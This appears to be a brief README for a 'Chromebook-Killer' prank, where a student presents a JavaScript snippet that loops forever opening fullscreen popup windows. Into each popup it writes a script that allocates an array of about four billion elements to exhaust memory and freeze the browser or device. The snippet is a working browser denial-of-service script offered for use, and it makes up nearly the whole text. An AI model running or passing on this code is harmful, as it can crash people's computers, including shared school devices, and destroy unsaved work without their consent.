# Chromebook-Killer
I was bored in school. Nothing new there.

```js
params  = 'width='+screen.width;
params += ', height='+screen.height;
params += ', top=0, left=0'
params += ', fullscreen=yes';
params += ', directories=no';
params += ', location=no';
params += ', menubar=no';
params += ', scrollbars=no';
params += ', status=no';
params += ', toolbar=no';

for(;;){
  var a = Math.floor(100*Math.random()+1);
  b = window.open("_blank","Lag"+a,params);
  b.document.body.innerHTML="<script>[...Array(2**32-1)]</script>";
}
```
